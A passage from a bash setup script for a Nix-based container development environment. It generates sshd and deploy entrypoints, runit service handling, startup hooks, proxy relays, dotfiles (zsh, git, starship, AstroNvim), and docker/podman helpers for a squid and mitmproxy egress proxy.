  echo "AuthorizedKeysFile /etc/nixenv/authorized_keys"
  echo "AllowUsers $APP_USER"
  echo "UsePAM no"
  echo "StrictModes no"          # bind-mounted HOME perms vary; don't reject keys
  echo "PrintMotd no"
  echo "AcceptEnv LANG LC_* ZMX_SESSION"
  [ -n "$SFTP" ] && echo "Subsystem sftp $SFTP"
} > "$SSHRUN/sshd_config"

cat > "$SVROOT/sshd/run" <<RUN
#!/bin/sh
exec "$SSHD" -D -e -f "$SSHRUN/sshd_config"
RUN
chmod +x "$SVROOT/sshd/run"

# --- Project services -------------------------------------------------------
# A project can ship runit services in its repo at <repo>/.nixenv/sv/<name>/run
# (an executable run script that exec's a FOREGROUND process), discovered at
# $APP_MOUNT/.nixenv/sv. Each is wrapped into a supervised service that runs as
# this user, next to sshd. Example for supervisord:
#   #!/bin/sh
#   exec supervisord -n -c "$NIXENV_APP_MOUNT/supervisord.conf"
# 1. Refresh declared services into the (persistent) service tree. Two sources,
# repo LAST so a project can override a service its flake/template ships:
#   $NIXENV_EXTRA_PROFILE/sv/<name>/run   declared by the project flake
#   $APP_MOUNT/.nixenv/sv/<name>/run      committed in the repo
for _svsrc in "${NIXENV_EXTRA_PROFILE:-}/sv" "$APP_MOUNT/.nixenv/sv"; do
  [ -d "$_svsrc" ] || continue
  for d in "$_svsrc"/*/; do
    [ -f "${d}run" ] || continue
    sname="$(basename "$d")"
    mkdir -p "$SVROOT/$sname"
    # rm first: the previous copy inherited the Nix store's read-only mode, so
    # a plain `cp` over it fails with "Permission denied" on every later boot.
    rm -f "$SVROOT/$sname/run"
    cp "${d}run" "$SVROOT/$sname/run" && chmod 0755 "$SVROOT/$sname/run"
  done
done

# PATH for hooks AND all services: the user's ~/.local/bin first, then the
# project profile (extra tooling), then base — so a hook can call binaries the
# project flake ships (e.g. a <project>-setup script) and a service can use e.g.
# supervisord. This MUST come before the hooks below: they run in this process
# and inherit this PATH. Same order as .zshenv/.zshrc, so a tool resolves the
# same way in a login shell, a hook and a runit service.
mkdir -p "$HOME/.local/bin"   # so `pip install --user` & friends land on PATH
_extra=""
[ -n "${NIXENV_EXTRA_PROFILE:-}" ] && [ -d "$NIXENV_EXTRA_PROFILE/bin" ] && _extra="$NIXENV_EXTRA_PROFILE/bin:"
export PATH="$HOME/.local/bin:${_extra}$PROFILE/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# 1a. Loopback relay to the shared proxy ------------------------------------
# curl/libcurl implement RFC 6761 internally: they resolve `localhost` and ANY
# `*.localhost` name to 127.0.0.1, ignoring /etc/hosts and DNS. So pointing
# <project>-<port>.<domain> at the proxy's IP in /etc/hosts does NOT work for
# curl, PHP ext-curl, Guzzle, Symfony HttpClient, …
# Fix: make loopback correct — relay 127.0.0.1:443/:80 to the proxy container.
# It's a raw TCP relay, so TLS stays end-to-end with caddy (SNI + Host header
# arrive intact → the wildcard cert matches and routing works). Needs
# net.ipv4.ip_unprivileged_port_start=0 on this container (set by 'run').
if [ -n "${NIXENV_PROXY_NAME:-}" ] && [ -x "$PROFILE/bin/socat" ]; then
  for _pp in 443 80; do
    mkdir -p "$SVROOT/proxy-relay-$_pp"
    # The proxy may not be up yet ('run' starts it AFTER this container), so the
    # service waits for it to resolve instead of failing. Exiting lets runsv
    # retry; the sleep throttles that to once every 5s.
    cat > "$SVROOT/proxy-relay-$_pp/run" <<RELAY
#!/bin/sh
getent hosts "$NIXENV_PROXY_NAME" >/dev/null 2>&1 || { sleep 5; exit 0; }
exec "$PROFILE/bin/socat" TCP4-LISTEN:$_pp,bind=127.0.0.1,fork,reuseaddr TCP:$NIXENV_PROXY_NAME:$_pp
RELAY
    chmod +x "$SVROOT/proxy-relay-$_pp/run"
  done
  echo "nixenv: loopback relay 127.0.0.1:443/:80 → $NIXENV_PROXY_NAME (public URLs work in-container)"
fi

# 1a2. On a restricted project the proxy is the ONLY route out, and the hook
# below may need it immediately (template first-run setup: composer/npm/wp-cli).
# 'run' starts the proxy first, but give DNS a moment to settle rather than
# letting the very first fetch fail with "could not resolve proxy".
if [ -n "${NIXENV_EGRESS_PROXY:-}" ]; then
  _pn="${NIXENV_EGRESS_PROXY#http://}"; _pn="${_pn%%:*}"
  _i=0
  while ! getent hosts "$_pn" >/dev/null 2>&1; do
    _i=$((_i+1))
    [ "$_i" -ge 20 ] && { echo "nixenv: WARNING egress proxy '$_pn' unreachable — network will fail"; break; }
    [ "$_i" = 1 ] && echo "nixenv: waiting for the egress proxy ($_pn)…"
    sleep 1
  done
fi

# 1b. Startup hooks. Every hook file that exists is sourced, in order:
#   $NIXENV_EXTRA_PROFILE/etc/nixenv-hooks.sh  (declared in the project flake)
#   $APP_MOUNT/.nixenv/hooks.sh                (committed in the repo)
#   $HOME/.nixenv-hooks.sh                     (local, in the home volume)
# Files are SOURCED, so top-level code in them runs right away; additionally, if
# the function `nixenv_pre_ssh_start` is defined, it is called after sourcing.
# (Top-level = every hook file accumulates; the function = last definition wins,
# so a repo/home hook can override the flake's. Never call `exit` at top level —
# it would terminate the entrypoint; use `return` inside the function.)
# Hooks run AFTER PATH is set (project profile first) and the service tree is
# refreshed, but BEFORE any service (incl. sshd) starts — so they can call
# binaries from the project flake and create $HOME/.nixenv-sv/<name>/run entries
# that get supervised in this same boot, seed config, wait on a dependency, etc.
# A failing hook warns but never blocks the container from starting.
for _hook in "${NIXENV_EXTRA_PROFILE:-}/etc/nixenv-hooks.sh" \
             "$APP_MOUNT/.nixenv/hooks.sh" \
             "$HOME_DIR/.nixenv-hooks.sh"; do
  [ -f "$_hook" ] || continue
  echo "nixenv: sourcing hooks $_hook"
  . "$_hook" || echo "nixenv: WARNING failed to source $_hook"
done
if command -v nixenv_pre_ssh_start >/dev/null 2>&1; then
  echo "nixenv: running hook nixenv_pre_ssh_start"
  nixenv_pre_ssh_start || echo "nixenv: WARNING nixenv_pre_ssh_start returned non-zero"
fi

# 2. Supervise EVERY service dir now present in $SVROOT (repo-declared, created
# by a startup hook, or installed there directly by a project setup script) —
# not just the ones discovered this boot. $SVROOT persists in the home volume;
# mimic runsvdir semantics (which we can't use: it spawns runsv via PATH and
# that lookup fails here). Remove a service by deleting its $SVROOT/<name> dir.
project_services=""
for d in "$SVROOT"/*/; do
  [ -f "${d}run" ] || continue
  sname="$(basename "$d")"
  [ "$sname" = "sshd" ] && continue   # sshd is PID 1's own runsv below
  project_services="$project_services $sname"
done

echo "nixenv: unprivileged sshd ready on :$SSHD_PORT as '$APP_USER' (per-project key only)"
[ -n "$project_services" ] && echo "nixenv: project services:$project_services"

# runsvdir would be the natural multi-service supervisor, but in this container
# it can't locate its runsv children — so we start each extra service under its
# own runsv (background) and keep sshd's runsv as PID 1.
for s in $project_services; do
  "$RUNSV" "$SVROOT/$s" &
done
exec "$RUNSV" "$SVROOT/sshd"
NIXENV_ENTRYPOINT

  cat > "$c/deploy-entrypoint.sh" <<'NIXENV_DEPLOY_ENTRYPOINT'
#!/bin/sh
# =============================================================================
# 'nixenv deploy' container entrypoint — a throwaway shell for deploying.
# =============================================================================
# Deliberately NOT the project entrypoint: what that one runs from the app
# volume (repo hooks, repo services) is writable from the dev container, and
# this one holds your forwarded agent. So: no hooks, no services, the same
# tools as the dev container (project + base profile), a tmpfs HOME rebuilt
# from the embedded skeleton + your git identity/credentials, and an sshd that
# listens on loopback ONLY — the host reaches it through '<engine> exec …
# socat', never over a network.
# =============================================================================
set -eu

APP_USER="${APP_USER:-app}"
PROFILE="${PROFILE:-/nix/var/nix/profiles/shared}"
HOME_DIR="${HOME:-/home/$APP_USER}"
SSHD_PORT="${SSHD_PORT:-2222}"
APP_MOUNT="${NIXENV_APP_MOUNT:-/app}"
CA_BUNDLE="$PROFILE/etc/ssl/certs/ca-bundle.crt"

# HOME is a fresh tmpfs: lay the skeleton down (shell/editor config), minus the
# example ssh config, which is replaced below.
[ -d /etc/nixenv/home-skel ] && cp -R /etc/nixenv/home-skel/. "$HOME_DIR/" 2>/dev/null || true
mkdir -p "$HOME_DIR/.ssh" "$HOME_DIR/.cache/omz" "$HOME_DIR/.local/bin" "$HOME_DIR/.nixenv-sshd"
chmod 700 "$HOME_DIR" "$HOME_DIR/.ssh"

# PATH: same order as the dev container — ~/.local/bin, project, base.
_extra=""
[ -n "${NIXENV_EXTRA_PROFILE:-}" ] && [ -d "$NIXENV_EXTRA_PROFILE/bin" ] && _extra="$NIXENV_EXTRA_PROFILE/bin:"
cat > "$HOME_DIR/.zshenv" <<EOF
export PROFILE="$PROFILE"
export NIXENV_PROJECT="${NIXENV_PROJECT:-}"
export NIXENV_APP_MOUNT="$APP_MOUNT"
export NIXENV_EXTRA_PROFILE="${NIXENV_EXTRA_PROFILE:-}"
export NIXENV_DEPLOY=1
export PATH="\$HOME/.local/bin:$_extra$PROFILE/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export ZSH="$PROFILE/share/oh-my-zsh"
export ZSH_CACHE_DIR="\$HOME/.cache/omz"
export SSL_CERT_FILE="$CA_BUNDLE"
export NIX_SSL_CERT_FILE="$CA_BUNDLE"
export CURL_CA_BUNDLE="$CA_BUNDLE"
export GIT_SSL_CAINFO="$CA_BUNDLE"
export EDITOR=vim
export LANG=C.UTF-8
# The repo's .git/config is writable from the dev container. Override the keys
# that run a program on ordinary git commands (they win over repo config).
# Other routes remain (aliases, filter drivers) — treat the code as untrusted.
export GIT_CONFIG_COUNT=3
export GIT_CONFIG_KEY_0=core.fsmonitor   GIT_CONFIG_VALUE_0=false
export GIT_CONFIG_KEY_1=core.hooksPath   GIT_CONFIG_VALUE_1=/dev/null
export GIT_CONFIG_KEY_2=core.sshCommand  GIT_CONFIG_VALUE_2=ssh
EOF

# Git identity + https credentials: the HOST-side home seed's files, mounted
# straight into HOME by 'deploy' (shared, not copied — a token the store helper
# rewrites lands back in the seed). The skeleton .gitconfig includes them.
# <project>/deploy_gitconfig: anything else, e.g. a pushInsteadOf.
if [ -f /etc/nixenv/deploy_gitconfig ]; then
  printf '\n# <project>/deploy_gitconfig (host side, read-only here)\n[include]\n\tpath = /etc/nixenv/deploy_gitconfig\n' >> "$HOME_DIR/.gitconfig"
fi

# Egress: the deploy network is --internal; squid (the project's allowed_hosts
# + deploy_hosts) is the only way out — HTTP via the env vars, ssh via CONNECT.
# Without any allowed host there is no proxy and no network at all.
{
  if [ -f /etc/nixenv/deploy_ssh_config ]; then
    echo "# Your host-side <project>/deploy_ssh_config (read-only here)."
    echo "Include /etc/nixenv/deploy_ssh_config"
    echo
  fi
  if [ -n "${NIXENV_EGRESS_PROXY:-}" ]; then
    _ep="${NIXENV_EGRESS_PROXY#http://}"; _ep="${_ep%/}"
    _ephost="${_ep%%:*}"; _epport="${_ep##*:}"
    echo "# nixenv-egress: everything tunnels through the egress proxy's CONNECT."
    echo "Host * !localhost !127.0.0.1 !$_ephost"
    echo "    ProxyCommand $PROFILE/bin/socat - PROXY:$_ephost:%h:%p,proxyport=$_epport"
    echo
  fi
  # Known hosts outlive the tmpfs HOME: <project>/deploy_known_hosts on the
  # host, mounted read-write. First contact is trust-on-first-use; a CHANGED
  # key is still refused.
  if [ -f /etc/nixenv/known_hosts ]; then
    echo "Host *"
    echo "    UserKnownHostsFile /etc/nixenv/known_hosts"
    echo "    StrictHostKeyChecking accept-new"
  fi
} > "$HOME_DIR/.ssh/config"
chmod 600 "$HOME_DIR/.ssh/config"
if [ -n "${NIXENV_EGRESS_PROXY:-}" ]; then
  cat >> "$HOME_DIR/.zshenv" <<EOF
export HTTP_PROXY="$NIXENV_EGRESS_PROXY" HTTPS_PROXY="$NIXENV_EGRESS_PROXY"
export http_proxy="$NIXENV_EGRESS_PROXY" https_proxy="$NIXENV_EGRESS_PROXY"
export NO_PROXY="localhost,127.0.0.1,::1" no_proxy="localhost,127.0.0.1,::1"
EOF
fi

SSHD="$PROFILE/bin/sshd"
[ -x "$SSHD" ] || { echo "nixenv: sshd not found in profile"; exit 1; }
SSHRUN="$HOME_DIR/.nixenv-sshd"
cp /etc/nixenv/ssh_host_ed25519_key "$SSHRUN/ssh_host_ed25519_key"
chmod 600 "$SSHRUN/ssh_host_ed25519_key"

{
  # Loopback only: the host connects through '<engine> exec … socat'. Nothing
  # on any network — dev containers included — can reach this sshd.
  echo "ListenAddress 127.0.0.1"
  echo "Port $SSHD_PORT"
  echo "HostKey $SSHRUN/ssh_host_ed25519_key"
  echo "PidFile $SSHRUN/sshd.pid"
  echo "PermitRootLogin no"
  echo "PubkeyAuthentication yes"
  echo "AuthenticationMethods publickey"
  echo "PasswordAuthentication no"
  echo "PermitEmptyPasswords no"
  echo "KbdInteractiveAuthentication no"
  echo "AuthorizedKeysFile /etc/nixenv/authorized_keys"
  echo "AllowUsers $APP_USER"
  echo "UsePAM no"
  echo "StrictModes no"
  echo "PrintMotd no"
  # The agent is the point of this container; nothing else is forwarded.
  echo "AllowAgentForwarding yes"
  echo "AllowTcpForwarding no"
  echo "AllowStreamLocalForwarding no"
  echo "X11Forwarding no"
  echo "PermitTunnel no"
  echo "PermitUserRC no"
  echo "PermitUserEnvironment no"
  echo "AcceptEnv LANG LC_*"
} > "$SSHRUN/sshd_config"

exec "$SSHD" -D -e -f "$SSHRUN/sshd_config"
NIXENV_DEPLOY_ENTRYPOINT

  cat > "$c/home-skel/.zshrc" <<'NIXENV_ZSHRC'
# =============================================================================
# .zshrc for the shared-store runtime container (per-project HOME)
# =============================================================================
# Oh My Zsh, its plugins, and the zsh-* plugins all come from the shared Nix
# store mounted read-only at /nix. Only writable, per-container state (cache,
# zcompdump) lives in the mounted project home / tmp.
# =============================================================================

# --- Oh My Zsh (from the shared Nix store) ---
export ZSH="${ZSH:-$PROFILE/share/oh-my-zsh}"
# $ZSH is read-only (Nix store), so OMZ must never self-update and must write
# its cache somewhere writable.
export ZSH_CACHE_DIR="${ZSH_CACHE_DIR:-/tmp/omz-cache}"
mkdir -p "$ZSH_CACHE_DIR"
DISABLE_AUTO_UPDATE=true
DISABLE_UPDATE_PROMPT=true
ZSH_THEME="robbyrussell"
plugins=(git z fzf docker rust golang node npm python pip)
source "$ZSH/oh-my-zsh.sh"

# --- Profiles on PATH ---
# Keep ~/.local/bin first and the per-project profile (extra tooling, e.g. a
# pinned PHP) AHEAD of the base profile, matching the order .zshenv set —
# otherwise base tools shadow the project's pinned versions. oh-my-zsh above may
# have reordered PATH, so re-assert.
_nixenv_pp=""
[ -n "${NIXENV_EXTRA_PROFILE:-}" ] && [ -d "$NIXENV_EXTRA_PROFILE/bin" ] && _nixenv_pp="$NIXENV_EXTRA_PROFILE/bin:"
export PATH="$HOME/.local/bin:${_nixenv_pp}$PROFILE/bin:$HOME/.cargo/bin:$PATH"

# --- Integrations ---
eval "$(fzf --zsh 2>/dev/null || true)"
eval "$(zoxide init zsh)"
eval "$(direnv hook zsh)"
eval "$(starship init zsh)"

# --- Zsh plugins from the shared store ---
source "$PROFILE/share/zsh-autosuggestions/zsh-autosuggestions.zsh" 2>/dev/null || true
source "$PROFILE/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" 2>/dev/null || true

export EDITOR=vim
export LANG="${LANG:-C.UTF-8}"

# Jump into the mounted repo on login (path set by the entrypoint's .zshenv).
_nixenv_app="${NIXENV_APP_MOUNT:-/app}"
[ -d "$_nixenv_app" ] && cd "$_nixenv_app" 2>/dev/null || true
NIXENV_ZSHRC

  cat > "$c/home-skel/.gitconfig" <<'NIXENV_GITCONFIG'
[include]
	path = ~/.gitconfig.identity
	path = ~/.gitconfig.credentials

# Sensible modern defaults, mostly from how git's own core developers configure
# git: https://blog.gitbutler.com/how-git-core-devs-configure-git#tldr
[init]
	defaultBranch = main
[column]
	ui = auto
[branch]
	sort = -committerdate
[tag]
	sort = version:refname
[core]
	pager = delta
	excludesfile = ~/.gitignore
[interactive]
	diffFilter = delta --color-only
[delta]
	navigate = true
	side-by-side = true
[merge]
	conflictstyle = diff3
[diff]
	algorithm = histogram
	colorMoved = plain
	mnemonicPrefix = true
	renames = true
[push]
	default = simple
	autoSetupRemote = true
	followTags = true
[fetch]
	prune = true
	pruneTags = true
	all = true
[help]
	autocorrect = prompt
[commit]
	verbose = true
[rerere]
	enabled = true
	autoupdate = true
[rebase]
	autoSquash = true
	autoStash = true
	updateRefs = true
NIXENV_GITCONFIG

  cat > "$c/home-skel/.gitignore" <<'NIXENV_GITIGNORE'
# Global gitignore (git core.excludesfile). Personal / OS / editor noise only —
# project-specific ignores belong in each repo's own .gitignore.
.DS_Store
*.swp
*~
.idea/
.vscode/
NIXENV_GITIGNORE

  cat > "$c/home-skel/.config/starship.toml" <<'NIXENV_STARSHIP'
[character]
success_symbol = "[➜](bold green)"
error_symbol = "[✗](bold red)"

# Show the nixenv project name (set per container via $NIXENV_PROJECT).
[env_var.NIXENV_PROJECT]
variable = "NIXENV_PROJECT"
symbol = "📂 "
style = "bold blue"
format = "[$symbol$env_value]($style) "

# Show the zmx session name when inside one ($ZMX_SESSION set by zmx).
[env_var.ZMX_SESSION]
variable = "ZMX_SESSION"
symbol = "⇌ "
style = "bold magenta"
format = "[$symbol$env_value]($style) "

# The container hostname is set to the project name, so show it too.
[hostname]
ssh_only = false
style = "bold green"
format = "[$hostname]($style) "

[container]
format = '[$symbol]($style) '
symbol = "📦"

[nix_shell]
symbol = "❄️ "

[rust]
symbol = "🦀 "

[golang]
symbol = "🐹 "

[nodejs]
symbol = "⬢ "

[python]
symbol = "🐍 "

[php]
symbol = "🐘 "
NIXENV_STARSHIP

  cat > "$c/home-skel/.vimrc" <<'NIXENV_VIMRC'
set nocompatible
syntax on
set number
set expandtab shiftwidth=2 tabstop=2
set ignorecase smartcase
NIXENV_VIMRC

  # AstroNvim (Neovim distro) — self-contained bootstrap. On first `nvim` launch,
  # lazy.nvim installs AstroNvim + the language packs (needs network; persists in
  # the home volume). Language servers come from the base toolchain (on PATH), so
  # mason auto-install is disabled. VS Code-like theme + file tree + tabs.
  cat > "$c/home-skel/.config/nvim/init.lua" <<'NIXENV_NVIM'
-- =============================================================================
-- nixenv AstroNvim config (self-contained). Edit freely.
-- =============================================================================
vim.g.mapleader = " "
vim.g.maplocalleader = ","

-- Bootstrap lazy.nvim
local lazypath = vim.fn.stdpath("data") .. "/lazy/lazy.nvim"
if not (vim.uv or vim.loop).fs_stat(lazypath) then
  vim.fn.system({
    "git", "clone", "--filter=blob:none",
    "https://github.com/folke/lazy.nvim.git", "--branch=stable", lazypath,
  })
end
vim.opt.rtp:prepend(lazypath)

require("lazy").setup({
  -- Core: AstroNvim v6 (tracks the 6.x line; currently 6.0.5)
  {
    "AstroNvim/AstroNvim",
    version = "^6",
    import = "astronvim.plugins",
    opts = {
      mapleader = " ",
      maplocalleader = ",",
      icons_enabled = true,
    },
  },

  -- Community packs matching the BASE toolchain, which ships NO language
  -- runtimes: only bash + lua (for editing this config) work out of the box.
  -- For any real language, add the runtime AND its language server to the
  -- project's own flake, then enable the matching pack via a per-project
  -- <repo>/.nixenv/home/.config/nvim/ override + `nixenv sync-home`, e.g.
  --   { import = "astrocommunity.pack.python" }   (with pyright in the flake)
  "AstroNvim/astrocommunity",
  { import = "astrocommunity.pack.bash" },
  { import = "astrocommunity.pack.lua" },

  -- VS Code-like colorscheme (Mofiqul/vscode.nvim)
  { import = "astrocommunity.colorscheme.vscode-nvim" },
  { "AstroNvim/astroui", opts = { colorscheme = "vscode" } },

  -- Use language servers from the Nix profile (on PATH); don't let mason
  -- download its own copies at runtime.
  { "williamboman/mason-lspconfig.nvim", opts = { ensure_installed = {}, automatic_installation = false } },
  { "WhoIsSethDaniel/mason-tool-installer.nvim", opts = { ensure_installed = {} } },

  -- A couple of VS Code-ish defaults
  {
    "AstroNvim/astrocore",
    opts = {
      options = {
        opt = { number = true, relativenumber = false, wrap = false, signcolumn = "yes" },
      },
    },
  },
}, {
  install = { colorscheme = { "vscode", "astrodark" } },
  ui = { backdrop = 100 },
  performance = { rtp = { disabled_plugins = { "gzip", "tarPlugin", "tohtml", "zipPlugin" } } },
})

-- Clipboard over SSH via OSC 52. Yanks to "+"/"*" are relayed to the terminal
-- as an OSC 52 escape, so they land on your LOCAL machine's clipboard even when
-- nvim runs headless over ssh. Registered on VeryLazy so it runs AFTER
-- AstroNvim's own (deferred) clipboard setup — otherwise AstroNvim overwrites it.
vim.api.nvim_create_autocmd("User", {
  pattern = "VeryLazy",
  once = true,
  callback = function()
    vim.opt.clipboard = "unnamedplus"
    local ok, osc52 = pcall(require, "vim.ui.clipboard.osc52")
    if ok then
      vim.g.clipboard = {
        name = "OSC 52",
        copy = { ["+"] = osc52.copy("+"), ["*"] = osc52.copy("*") },
        paste = { ["+"] = osc52.paste("+"), ["*"] = osc52.paste("*") },
      }
    end
  end,
})
NIXENV_NVIM

  cat > "$c/home-skel/.ssh/config" <<'NIXENV_SSHCFG'
# Per-project SSH config. Drop private keys in this folder (mode 600).
# Example:
# Host github.com
#   User git
#   AddKeysToAgent yes
#   IdentityFile ~/.ssh/id_ed25519
NIXENV_SSHCFG

  [ -f "$c/home-skel/.ssh/known_hosts" ] || : > "$c/home-skel/.ssh/known_hosts"
  chmod 700 "$c/home-skel/.ssh"
  chmod 600 "$c/home-skel/.ssh/config" "$c/home-skel/.ssh/known_hosts" 2>/dev/null || true
}

have() { command -v "$1" >/dev/null 2>&1; }

# Decide which container engine to use (docker or podman). Order:
#   1. CONTAINER_ENGINE env override
#   2. remembered choice in $ENGINE_FILE
#   3. auto-detect; if BOTH are present, prompt (and remember the answer)
resolve_engine() {
  [ -n "$ENGINE" ] && return 0

  if [ -n "$CONTAINER_ENGINE" ]; then
    have "$CONTAINER_ENGINE" || die "CONTAINER_ENGINE='$CONTAINER_ENGINE' not found on PATH"
    ENGINE="$CONTAINER_ENGINE"; return 0
  fi

  if [ -f "$ENGINE_FILE" ]; then
    local saved; saved="$(cat "$ENGINE_FILE" 2>/dev/null || true)"
    if have "$saved"; then ENGINE="$saved"; return 0; fi
  fi

  local d=0 p=0
  have docker && d=1
  have podman && p=1

  if [ "$d" = 1 ] && [ "$p" = 1 ]; then
    local choice=""
    if [ -t 0 ]; then
      printf 'Both docker and podman are available. Which to use? [docker/podman] (docker): '
      read -r choice || true
    fi
    case "$choice" in
      podman|p)        ENGINE=podman;;
      ""|docker|d)     ENGINE=docker;;
      *) die "invalid choice: $choice";;
    esac
    mkdir -p "$(dirname "$ENGINE_FILE")" && printf '%s\n' "$ENGINE" > "$ENGINE_FILE"
    ok "Using container engine: $ENGINE  (remembered in $ENGINE_FILE — delete it to re-choose)"
  elif [ "$d" = 1 ]; then ENGINE=docker
  elif [ "$p" = 1 ]; then ENGINE=podman
  else return 1
  fi
}

# Qualify image names with docker.io for podman (which doesn't assume a default
# registry for short names); a no-op for docker.
img() {
  [ "$ENGINE" = podman ] || { printf '%s' "$1"; return; }
  case "$1" in
    */*)
      # Has a slash: the first component is a registry only if it looks like a
      # host (contains '.' or ':' or is 'localhost'); otherwise it's a repo path.
      case "${1%%/*}" in
        *.*|*:*|localhost) printf '%s' "$1";;
        *) printf 'docker.io/%s' "$1";;
      esac;;
    *) printf 'docker.io/%s' "$1";;        # no slash → Docker Hub short name
  esac
}

require_engine() {
  resolve_engine || die "neither docker nor podman found on PATH"
  "$ENGINE" info >/dev/null 2>&1 || die "$ENGINE not reachable (is the daemon running?)"
  # Decided ONCE, here in the main shell: engine_userns runs inside $(…), where
  # a cached answer would be lost and every call would re-ask the engine.
  if [ "$ENGINE" = podman ] && [ -z "${ENGINE_ROOTLESS:-}" ]; then
    ENGINE_ROOTLESS="$(podman_rootless_probe)"
  fi
}

# true | false — is this podman rootless? Rootful podman (a system service, or
# the dev environment's sidecar reached with --remote) REJECTS --userns=keep-id:
# "keep-id is only supported in rootless mode". Unknown → assume rootless, the
# common desktop case and the old behaviour.
podman_rootless_probe() {
  local r; r="$("$ENGINE" info --format '{{.Host.Security.Rootless}}' 2>/dev/null || true)"
  case "$r" in false) printf false;; *) printf true;; esac
}

# Rootless podman remaps uids; --userns=keep-id makes the container see your real
# host uid (so bind-mounted files stay writable). No-op for docker and for
# rootful podman, where the uid is already the real one.
engine_userns() {
  [ "$ENGINE" = podman ] || return 0
  local rootless="${ENGINE_ROOTLESS:-}"
  [ -n "$rootless" ] || rootless="$(podman_rootless_probe)"
  [ "$rootless" = true ] && printf '%s' "--userns=keep-id"
  return 0
}

# Ensure the shared user network exists. Project containers and the proxy join it
# so the proxy can reach each project by its container name (nixenv-<project>).
# User-defined networks give container-name DNS on both docker and modern podman
# (netavark). Idempotent.
ensure_proxy_net() {
  "$ENGINE" network inspect "$PROXY_NET" >/dev/null 2>&1 || \
    "$ENGINE" network create "$PROXY_NET" >/dev/null 2>&1 || \
    warn "could not create network '$PROXY_NET' (proxy routing may not work)"
}

# The egress container's own network: its route out. Only it and the Caddy
# proxy join it — the link ingress capture runs over — and no project does, so
# nothing else can reach squid or mitmproxy through it.
ensure_egress_net() {
  "$ENGINE" network inspect "$EGRESS_NET" >/dev/null 2>&1 || \
    "$ENGINE" network create "$EGRESS_NET" >/dev/null 2>&1 || \
    warn "could not create network '$EGRESS_NET' (egress will not work)"
}

# Join the egress container to every restricted project's internal net: the
# project reaches squid there — its ONLY way out.
egress_connect_nets() {
  local rp
  for rp in $EGRESS_PROJECTS; do
    "$ENGINE" network connect "$(internal_net "$rp")" "$EGRESS_NAME" >/dev/null 2>&1 || true
  done
  for rp in ${EGRESS_DEPLOYS:-}; do
    "$ENGINE" network connect "$(deploy_net "$rp")" "$EGRESS_NAME" >/dev/null 2>&1 || true
  done
}

# Restart mitmproxy in place (egress.sh's loop starts it again, re-reading
# capture.conf). Also drops the UI's in-memory flows; the files stay.
capture_restart() {
  "$ENGINE" exec "$EGRESS_NAME" sh -c \
    'p="$(cat /data/run/mitm.pid 2>/dev/null)"; [ -z "$p" ] || kill "$p"' >/dev/null 2>&1 || true
}

# Apply regenerated configs to the RUNNING egress container: squid reloads its
# ACLs (no restart, so open tunnels survive) and mitmproxy restarts only if its
# listeners changed. Run write_egress_configs first.
egress_reload() {
  "$ENGINE" exec "$EGRESS_NAME" "$PROFILE/bin/squid" -f /etc/egress/squid.conf -k reconfigure >/dev/null 2>&1 \
    || { warn "squid did not reload in '$EGRESS_NAME'"; return 1; }
  [ "${CAPTURE_CHANGED:-0}" = 1 ] && capture_restart
  return 0
}

# Start or refresh the egress container (squid, + mitmproxy while a project is
# captured), separate from the Caddy proxy so recreating Caddy — every restricted
# 'run' does, for its relays — no longer cuts every project off the network.
# Run write_egress_configs first. A running container is only reloaded; it is
# recreated only when missing, or when it still publishes a port (the mitmweb UI
# used to be on 127.0.0.1:8081; Caddy now serves it as <project>-mitm.<domain>).
egress_up() {
  if [ -z "${EGRESS_PROJECTS:-}${EGRESS_DEPLOYS:-}" ]; then
    if container_exists "$EGRESS_NAME"; then
      "$ENGINE" rm -f "$EGRESS_NAME" >/dev/null 2>&1 || true
      log "no restricted project or deploy allowlist — removed the egress proxy '$EGRESS_NAME'"
    fi
    return 0
  fi
  ensure_egress_net
  if container_running "$EGRESS_NAME" \
     && ! "$ENGINE" port "$EGRESS_NAME" 2>/dev/null | grep -q .; then
    if [ "$(egress_script_sum)" != "$("$ENGINE" inspect -f "{{index .Config.Labels \"$EGRESS_SUM_LABEL\"}}" "$EGRESS_NAME" 2>/dev/null)" ]; then
      # egress.sh is read ONCE, at container start (capture_loop lives in that
      # shell's memory), so a rewritten script never reaches a running
      # container: one predating the link-subnet fix kept binding mitmweb and
      # the ingress listeners to 127.0.0.1 — 502 on <p>-<port> and <p>-mitm.
      log "egress startup script changed — recreating '$EGRESS_NAME'"
    else
      egress_connect_nets
      egress_reload && return 0
      warn "recreating '$EGRESS_NAME'"
    fi
  fi
  "$ENGINE" rm -f "$EGRESS_NAME" >/dev/null 2>&1 || true
  mkdir -p "$EGRESS_DATA_DIR"
  log "Starting egress proxy '$EGRESS_NAME' (squid${CAPTURE_PROJECTS:+ + mitmproxy capturing:$CAPTURE_PROJECTS})"
  egress_run || die "failed to start the egress proxy '$EGRESS_NAME'"
  egress_connect_nets
}
# Checksum of the egress.sh a container runs, stored as a label at creation
# so egress_up can tell when the running one is stale. cksum: POSIX, on macOS too.
EGRESS_SUM_LABEL="nixenv.egress-sh"
egress_script_sum() {
  cksum < "$PROXY_DIR/egress/egress.sh" 2>/dev/null | awk '{print $1 "-" $2}'
}
egress_run() {
  "$ENGINE" rm -f "$EGRESS_NAME" >/dev/null 2>&1 || true
  "$ENGINE" run -d \
    --name "$EGRESS_NAME" \
    --label "$EGRESS_SUM_LABEL=$(egress_script_sum)" \
    --network "$EGRESS_NET" \
    --network-alias "$EGRESS_LINK" \
    --user "$(id -u):$(id -g)" \
    $(engine_userns) \
    $(container_hardening_args) \
    -v "$NIX_VOLUME":/nix:ro \
    -v "$PROXY_DIR/egress":/etc/egress:ro \
    -v "$EGRESS_DATA_DIR":/data \
    -e HOME=/data -e PYTHONUNBUFFERED=1 \
    -w /data \
    "$(img "$RUNTIME_IMAGE")" \
    sh /etc/egress/egress.sh >/dev/null
}

# mitmproxy writes its CA on first start. Wait for it (≤20s) so a container
# created right after 'capture on' can mount it. Returns 1 if it never appears.
capture_wait_ca() {
  local f="$EGRESS_DATA_DIR/mitmproxy/mitmproxy-ca-cert.pem" i=0
  while [ ! -s "$f" ]; do
    i=$((i + 1)); [ "$i" -gt 20 ] && return 1
    sleep 1
  done
}

# Settings fixed when a project container is CREATED, which a running one may
# predate. Warns (returns 1) when '<project>' needs 'stop && run'; $2=1 for a
# restricted project.
container_needs_recreate() {
  local name="$1" restricted="$2" cname env mounts stale=""
  cname="$(container_name "$name")"
